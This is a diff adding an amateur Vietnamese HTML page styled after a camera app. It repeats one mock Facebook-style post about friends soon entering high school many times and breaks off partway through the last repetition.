@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>LOCKET CỦA TỜ CAAA NÈ!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(to bottom right, #1c1c1c, #292929);
+      color: white;
+      overflow-x: hidden;
+    }
+
+    #loading-screen {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: #000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .loading-content {
+      text-align: center;
+    }
+    .loading-heart {
+      font-size: 64px;
+      color: #ff4d6d;
+      animation: beat 1s infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes beat {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.4); }
+    }
+    .loading-content input, .loading-content button {
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      outline: none;
+    }
+    .loading-content input {
+      margin-bottom: 10px;
+    }
+    .loading-content button {
+      background-color: #4ade80;
+      color: #000;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .loading-content button:hover {
+      background-color: #22c55e;
+    }
+
+    .camera-app {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 10px;
+      min-height: 100vh;
+    }
+
+    .camera-box {
+      background: #111;
+      border-radius: 30px;
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      margin-bottom: 30px;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+
+    .top-bar i {
+      background: rgba(255,255,255,0.1);
+      padding: 10px;
+      border-radius: 50%;
+    }
+
+    .camera-screen {
+      width: 100%;
+      border-radius: 20px;
+      overflow: hidden;
+      margin-bottom: 15px;
+    }
+
+    .camera-screen video {
+      width: 100%;
+      object-fit: cover;
+      border-radius: 20px;
+    }
+
+    .filters, .controls {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 15px;
+    }
+
+    .filters button, .action-btn {
+      padding: 6px 12px;
+      border: none;
+      border-radius: 10px;
+      background: #333;
+      color: white;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .filters button:hover, .action-btn:hover {
+      background: #4ade80;
+      color: black;
+    }
+
+    .shutter {
+      width: 70px;
+      height: 70px;
+      background: white;
+      border: 5px solid #FFD700;
+      border-radius: 50%;
+    }
+
+    .post {
+      background: #fff;
+      color: #000;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 500px;
+      margin: 40px auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      padding: 16px;
+    }
+    .user-info {
+      display: flex;
+      align-items: center;
+    }
+    .avatar {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      margin-right: 10px;
+      object-fit: cover;
+    }
+    .username {
+      font-weight: bold;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .username img {
+      width: 18px;
+      height: 18px;
+    }
+    .time {
+      font-size: 13px;
+      color: #555;
+    }
+    .post-text {
+      margin: 12px 0;
+      font-size: 15px;
+    }
+    .post-image {
+      width: 100%;
+      border-radius: 10px;
+      margin-top: 10px;
+    }
+    .reaction-menu {
+      display: none;
+      justify-content: space-around;
+      margin-top: 10px;
+      animation: fadeIn 0.2s ease-in-out;
+    }
+    .reaction-menu img {
+      width: 32px;
+      height: 32px;
+      cursor: pointer;
+    }
+    .reactions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 12px;
+      color: #555;
+      font-size: 14px;
+    }
+    .actions {
+      display: flex;
+      justify-content: space-around;
+      padding-top: 10px;
+      border-top: 1px solid #ccc;
+    }
+    .comment-section {
+      margin-top: 15px;
+    }
+    .comment-input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    .comment {
+      background: #f0f2f5;
+      padding: 8px 10px;
+      border-radius: 8px;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0 }
+      to { opacity: 1 }
+    }
+  </style>
+</head>
+<body>
+  <div id="loading-screen">
+    <div class="loading-content">
+      <div class="loading-heart">💛</div>
+      <h1>👋 Xin chào, Tôi là NGUYỄN DUY TK! Bạn tên là gì?</h1>
+      <input type="text" id="username" placeholder="Nhập tên của bạn" />
+      <br>
+      <button onclick="startApp()">Bắt đầu</button>
+    </div>
+  </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+    </div>
+    <div class="post">
+    <div class="user-info">
+      <img src="/ảnh/hi.jpg" class="avatar" />
+      <div>
+        <div class="username">
+          Nguyễn Thế Duy
+          <img src="/ảnh/acc-fb-co-nut-len-tich-xanh-cp-mail-random-quoc-gia_919700856.png" alt="tick xanh">
+        </div>
+        <div class="time">30 tháng 3 · 🌸</div>
+      </div>
+    </div>
+
+    <div class="post-text">
+      bọn mình chắc còn khoảng tầm hơn 60 ngày nữa là bọn mình thì vào cấp 3 r !! 🌸<br />
+      có mỗi buổi đi chơi ~ bọn mình cũng giữ tình bạn này lâu dài nha~...
+    </div>
+
+    <img src="/ảnh/494862902_1022294033333826_2324815831985653930_n.jpg" class="post-image" />
+
+    <div class="reaction-menu" id="reactionMenu">
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4f/1/32/1f44d.png" onclick="react('👍 Like')" title="Like" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/ta3/1/32/1f60d.png" onclick="react('❤️ Love')" title="Love" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t4c/1/32/1f923.png" onclick="react('😂 Haha')" title="Haha" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/te0/1/32/1f62e.png" onclick="react('😮 Wow')" title="Wow" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/t91/1/32/1f622.png" onclick="react('😢 Sad')" title="Sad" />
+      <img src="https://static.xx.fbcdn.net/images/emoji.php/v9/tf9/1/32/1f620.png" onclick="react('😡 Angry')" title="Angry" />
+    </div>
+
+    <div class="reactions" id="reactionText">
